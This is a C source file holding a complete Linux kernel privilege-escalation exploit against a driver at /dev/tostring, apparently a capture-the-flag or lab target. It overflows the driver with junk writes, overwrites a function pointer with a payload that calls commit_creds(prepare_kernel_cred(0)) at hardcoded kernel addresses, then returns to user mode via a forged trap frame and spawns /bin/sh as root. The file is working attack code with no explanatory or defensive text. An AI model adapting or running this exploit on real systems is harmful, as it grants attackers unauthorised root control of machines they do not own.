```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>

#define REG_PARAM(n) __attribute__((regparm(n)))
#define PACKED __attribute__((packed))

typedef struct PACKED trap_frame_s {
	void * eip ; // instruction pointer
	uint32_t cs ; // code segment
	uint32_t eflags ; // CPU flags
	void * esp ; // stack pointer
	uint32_t ss ; // stack segment
} trap_frame;

trap_frame tf;

void* (*prepare_kernel_cred)(void*) REG_PARAM(1) = (void*) 0xc10711f0;
void* (*commit_creds)(void*) REG_PARAM(1) = (void*) 0xc1070e80;
void payload()
{
	commit_creds(prepare_kernel_cred(0));
	asm("mov $tf, %esp;"
		"iret;");
}

void shell()
{
	execl("/bin/sh", "sh", NULL);
}

void prepare_tf(void) {
	asm ("pushl %cs; popl tf+4;"
	  	"pushfl; popl tf+8;"
		"pushl %esp; popl tf+12;"
		"pushl %ss; popl tf+16;");
	tf.eip = &shell;
	tf.esp -= 1024; // unused part of stack
}

int main(int ac, char** av)
{
	int fd = open("/dev/tostring", O_RDWR);
	char payload_addr[4];

	for (int i = 0; i < 64; i++) {		write(fd, "qwertyu\0", 8); 
	}
	*(void**)(payload_addr) = &payload;
	write(fd, payload_addr, 4);

	prepare_tf();

	read(fd, NULL, 0); 

	close(fd);
}
```